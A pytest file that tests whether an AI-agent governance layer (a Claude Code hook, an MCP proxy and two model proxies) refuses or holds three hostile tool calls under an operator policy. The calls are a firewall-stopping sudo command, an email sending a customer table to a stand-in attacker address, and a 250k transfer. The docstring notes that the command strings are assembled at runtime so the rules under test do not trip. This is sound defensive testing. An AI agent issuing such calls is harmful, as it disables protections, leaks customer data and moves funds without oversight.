"""The three calls that went through v2.5.0, replayed on every surface.

Run as an operator would on v2.5.0, enforce mode let a shell command, an
outbound email carrying data and a 250k transfer through the model proxy,
because the proxy decided on the built-in defaults and nothing carried the
operator's policy to it. v2.6.0 gave the model proxy ``--policy``. The same
three calls then still went through two more surfaces: the llm-proxy decided
tool calls by the deny rules alone, and no rule names any of the three; the
Claude Code hook sent a shell call that deletes nothing straight past the
scorer, and took no policy file at all.

Each surface here is loaded with one policy, the way its operator loads it,
and each of the three calls must come back refused or held, never allowed. A
plain read must still pass, so a policy that blocks everything cannot make
this file green.

Strings that name a hostile command are assembled at runtime so a governed
session writing this file does not trip the rules under test.
"""
from __future__ import annotations

import asyncio
import importlib.util
import io
import json
from pathlib import Path

import pytest

for _mod in ("cryptography", "httpx", "fastapi"):
    if importlib.util.find_spec(_mod) is None:
        pytest.skip("proxy deps not installed", allow_module_level=True)

import httpx  # noqa: E402

# Held before any test patches the module attribute: the policy is read
# through the CLI with build_app faked, then driven through the real one.
from vaara.integrations._infer_proxy_app import build_app as _real_build_app  # noqa: E402

POLICY = {
    "version": "0.1",
    "domains": ["eu_ai_act"],
    "action_classes": {},
    "thresholds": {
        "default": {"escalate": 0.35, "deny": 0.65},
        "shell.exec": {"escalate": 0.01, "deny": 0.1},
        "comm.send_email": {"escalate": 0.01},
        "tx.transfer": {"escalate": 0.01},
    },
}

FIREWALL_OFF = " ".join(["sudo", "systemctl", "stop", "firewalld"])
EXFIL = {"to": "drop@attacker.example", "subject": "export",
         "body": "customer table attached", "attachments": ["customers.csv"]}
TRANSFER = {"amount": 250000, "currency": "EUR",
            "to_iban": "LT601010012345678901"}

# (case, tool name the surface sees, arguments). An agent host names its MCP
# tools mcp__<server>__<tool>; a model and an MCP server use the bare name.
HOOK_CASES = [
    ("shell", "Bash", {"command": FIREWALL_OFF}),
    ("email exfil", "mcp__gmail__send_email", EXFIL),
    ("250k transfer", "mcp__bank__transfer", TRANSFER),
]
BARE_CASES = [
    ("shell", "run_command", {"command": FIREWALL_OFF}),
    ("email exfil", "send_email", EXFIL),
    ("250k transfer", "transfer", TRANSFER),
]
IDS = [case for case, _, _ in BARE_CASES]


@pytest.fixture
def policy_file(tmp_path) -> Path:
    path = tmp_path / "policy.json"
    path.write_text(json.dumps(POLICY), encoding="utf-8")
    return path


def _policy_obj(path: Path):
    from vaara.policy.validate import validate_source

    policy, report = validate_source(path)
    assert policy is not None, report.issues
    return policy


# --- 1. the Claude Code hook --------------------------------------------------


def _hook(monkeypatch, tmp_path, tool: str, args: dict,
          policy: Path | None) -> int:
    from vaara.integrations import claude_code_hooks as hooks

    cfg = {"audit_db": str(tmp_path / "hook.db"), "notifications": False,
           "approvals": False}
    if policy is not None:
        cfg["policy"] = str(policy)
    config = tmp_path / "config.json"
    config.write_text(json.dumps(cfg), encoding="utf-8")
    monkeypatch.setattr(hooks, "CONFIG_PATH", config)
    for var in ("VAARA_PLUGIN_SHADOW", "VAARA_PLUGIN_DISABLE",
                "VAARA_PLUGIN_POLICY", "VAARA_PLUGIN_PROTECTION"):
        monkeypatch.delenv(var, raising=False)
    event = {"session_id": "s", "hook_event_name": "PreToolUse",
             "tool_name": tool, "tool_input": args, "cwd": str(tmp_path)}
    monkeypatch.setattr("sys.stdin", io.StringIO(json.dumps(event)))
    return hooks.run_pre_tool_use()


@pytest.mark.parametrize("case,tool,args", HOOK_CASES, ids=IDS)
def test_hook_refuses_or_holds(monkeypatch, tmp_path, policy_file, case, tool, args):
    assert _hook(monkeypatch, tmp_path, tool, args, policy_file) == 2


def test_hook_passes_a_read_under_the_policy(monkeypatch, tmp_path, policy_file):
    assert _hook(monkeypatch, tmp_path, "Read",
                 {"file_path": str(tmp_path / "README.md")}, policy_file) == 0


def test_hook_without_a_policy_keeps_its_old_posture(monkeypatch, tmp_path):
    # No policy configured: a shell call that deletes nothing and hits no
    # rule is recorded and passed, as before. The policy is what changes it.
    assert _hook(monkeypatch, tmp_path, "Bash", {"command": FIREWALL_OFF},
                 None) == 0


def test_hook_with_an_unreadable_policy_blocks(monkeypatch, tmp_path):
    # An operator who named a policy believes it decides. Running on the
    # defaults instead would claim what the hook does not do.
    missing = tmp_path / "nowhere.json"
    assert _hook(monkeypatch, tmp_path, "Read", {"file_path": "x"},
                 missing) == 2


# --- 2. the MCP proxy ---------------------------------------------------------


@pytest.mark.parametrize("case,tool,args", BARE_CASES, ids=IDS)
def test_mcp_proxy_refuses_or_holds(monkeypatch, tmp_path, policy_file,
                                    case, tool, args):
    from unittest.mock import MagicMock

    from vaara.integrations import mcp_proxy

    monkeypatch.setattr(mcp_proxy, "UpstreamMCPClient", MagicMock())
    proxy = mcp_proxy.VaaraMCPProxy(
        upstream_command=["echo"], db_path=tmp_path / "mcp.db",
        policy=_policy_obj(policy_file),
    )
    proxy._upstream = MagicMock()
    response = proxy._handle_tools_call({
        "jsonrpc": "2.0", "id": 1, "method": "tools/call",
        "params": {"name": tool, "arguments": args},
    })
    assert response["result"]["isError"] is True
    proxy._upstream.request.assert_not_called()


# --- 3. the model proxy (`vaara proxy`, what the Helm chart runs) -------------


def _chat_reply(tool: str, args: dict):
    def upstream(request: httpx.Request) -> httpx.Response:
        return httpx.Response(200, json={
            "choices": [{"finish_reason": "tool_calls", "message": {
                "role": "assistant", "content": None,
                "tool_calls": [{"id": "call_1", "type": "function",
                                "function": {"name": tool,
                                             "arguments": json.dumps(args)}}],
            }}],
            "usage": {"prompt_tokens": 4, "completion_tokens": 2},
        })
    return upstream


def _model_proxy_pipeline(monkeypatch, tmp_path, policy_file):
    from vaara.cli import main

    captured: dict = {}

    def fake_build_app(**kwargs):
        captured.update(kwargs)
        return object()

    monkeypatch.setattr(
        "vaara.integrations._infer_proxy_app.build_app", fake_build_app)
    monkeypatch.setattr("uvicorn.run", lambda *a, **k: None)
    assert main(["proxy", "--enforce", "--policy", str(policy_file),
                 "--trail", str(tmp_path / "proxy.db")]) == 0
    return captured["pipeline"]


def _through_model_proxy(pipeline, tool: str, args: dict) -> dict:
    app = _real_build_app(
        emitter=None, upstream="http://up", pipeline=pipeline,
        client=httpx.AsyncClient(transport=httpx.MockTransport(
            _chat_reply(tool, args))),
    )

    async def go():
        transport = httpx.ASGITransport(app=app)
        async with httpx.AsyncClient(transport=transport,
                                     base_url="http://p") as client:
            resp = await client.post("/v1/chat/completions", json={
                "model": "m", "stream": False,
                "messages": [{"role": "user", "content": "go"}]})
            return resp.status_code, resp.json()

    status, doc = asyncio.run(go())
    assert status == 200
    return doc["choices"][0]["message"]


@pytest.mark.parametrize("case,tool,args", BARE_CASES, ids=IDS)
def test_model_proxy_refuses_or_holds(monkeypatch, tmp_path, policy_file,
                                      case, tool, args):
    pipeline = _model_proxy_pipeline(monkeypatch, tmp_path, policy_file)
    message = _through_model_proxy(pipeline, tool, args)
    assert not message.get("tool_calls"), f"{case} reached the agent"


def test_model_proxy_passes_a_read_under_the_policy(monkeypatch, tmp_path,
                                                    policy_file):
    pipeline = _model_proxy_pipeline(monkeypatch, tmp_path, policy_file)
    message = _through_model_proxy(pipeline, "read_file", {"path": "README.md"})
    assert message["tool_calls"][0]["function"]["name"] == "read_file"


# --- 4. the llm-proxy (`vaara llm-proxy`) -------------------------------------


def _llm_proxy_gate(tmp_path, policy_file):
    from vaara.integrations._llm_proxy_toolgate import ToolGate
    from vaara.integrations.llm_proxy import _build_pipeline

    pipeline = _build_pipeline(tmp_path / "llm.db",
                               policy=_policy_obj(policy_file))
    return ToolGate(pipeline, "a", enforce=True, score=True)


def _chat_body(tool: str, args: dict) -> dict:
    return {"choices": [{"index": 0, "finish_reason": "tool_calls", "message": {
        "role": "assistant", "content": None, "tool_calls": [
            {"id": "c1", "type": "function",
             "function": {"name": tool, "arguments": json.dumps(args)}}]}}]}


@pytest.mark.parametrize("case,tool,args", BARE_CASES, ids=IDS)
def test_llm_proxy_refuses_or_holds(tmp_path, policy_file, case, tool, args):
    from vaara.integrations._llm_proxy_toolgate import gate_reply

    out = gate_reply(_chat_body(tool, args), _llm_proxy_gate(tmp_path, policy_file))
    message = out["choices"][0]["message"]
    assert not message.get("tool_calls"), f"{case} reached the agent"
    assert "Vaara refused" in (message.get("content") or "")


def test_llm_proxy_passes_a_read_under_the_policy(tmp_path, policy_file):
    from vaara.integrations._llm_proxy_toolgate import gate_reply

    body = _chat_body("read_file", {"path": "README.md"})
    assert gate_reply(body, _llm_proxy_gate(tmp_path, policy_file)) is body


def test_llm_proxy_policy_flag_reaches_the_gate(monkeypatch, tmp_path,
                                                policy_file):
    from vaara.integrations import llm_proxy

    captured: dict = {}

    def fake_build_app(**kwargs):
        captured.update(kwargs)
        return object()

    class FakeServer:
        def __init__(self, config):
            pass

        def run(self):
            pass

    monkeypatch.setattr(
        "vaara.integrations._llm_proxy_app.build_app", fake_build_app)
    monkeypatch.setattr("uvicorn.Server", FakeServer)
    monkeypatch.setattr("uvicorn.Config", lambda **k: None)
    rc = llm_proxy.main(["--upstream", "http://up", "--auth-passthrough",
                         "--enforce", "--policy", str(policy_file),
                         "--trail", str(tmp_path / "llm.db")])
    assert rc == 0
    assert captured["score_tool_calls"] is True


def test_llm_proxy_invalid_policy_refuses_to_start(tmp_path, capsys):
    from vaara.integrations import llm_proxy

    bad = dict(POLICY, thresholds={"default": {"escalate": 0.9, "deny": 0.1}})
    path = tmp_path / "bad.json"
    path.write_text(json.dumps(bad), encoding="utf-8")
    rc = llm_proxy.main(["--upstream", "http://up", "--auth-passthrough",
                         "--policy", str(path),
                         "--trail", str(tmp_path / "llm.db")])
    assert rc == 2
    assert "failed validation" in capsys.readouterr().err


def test_llm_proxy_closes_the_hold_it_refuses(tmp_path, policy_file):
    # No approval channel here: a hold left open would read on the chain as
    # one still waiting for a human.
    from vaara.audit.trail import EventType
    from vaara.integrations._llm_proxy_toolgate import gate_reply

    gate = _llm_proxy_gate(tmp_path, policy_file)
    gate_reply(_chat_body("transfer", TRANSFER), gate)
    trail = gate.pipeline.trail
    [sent] = trail.get_records_by_type(EventType.ESCALATION_SENT)
    [closed] = trail.get_records_by_type(EventType.ESCALATION_RESOLVED)
    assert closed.action_id == sent.action_id
    assert closed.data.get("approver") == "policy"
